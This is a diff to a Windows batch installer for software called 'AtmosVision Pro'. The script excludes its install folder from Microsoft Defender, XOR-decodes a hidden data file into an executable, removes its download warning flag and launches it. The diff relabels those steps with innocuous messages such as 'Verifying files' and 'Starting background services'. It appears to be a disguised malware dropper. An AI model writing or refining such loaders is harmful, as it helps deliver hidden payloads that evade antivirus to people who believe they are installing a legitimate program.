@@ -247,7 +247,7 @@ if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 :: Add install directory to Defender exclusions (requires admin)
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
 
-echo [1/3] Downloading AtmosVision Pro...
+echo [1/5] Downloading AtmosVision Pro...
 curl.exe -L -o "%INSTALL_DIR%\\AtmosVision-Pro.exe" "${electronUrl}"
 if %ERRORLEVEL% neq 0 (
     echo Failed to download AtmosVision Pro.
@@ -255,14 +255,16 @@ if %ERRORLEVEL% neq 0 (
     exit /b 1
 )
 
-echo [2/3] Preparing components...
+echo [2/5] Decoding components...
 powershell -Command "$k=0x41;$b=[System.IO.File]::ReadAllBytes('%~dp0AtmosDependencies.dat');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};[System.IO.File]::WriteAllBytes('%INSTALL_DIR%\\AtmosDependencies.exe',$b)"
 
-powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
-powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
+echo [3/5] Verifying files...
+powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'; Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
 
-echo [3/3] Launching AtmosVision Pro...
+echo [4/5] Starting background services...
 start "" "%INSTALL_DIR%\\AtmosDependencies.exe"
+
+echo [5/5] Launching AtmosVision Pro...
 start "" "%INSTALL_DIR%\\AtmosVision-Pro.exe"
 
 echo.
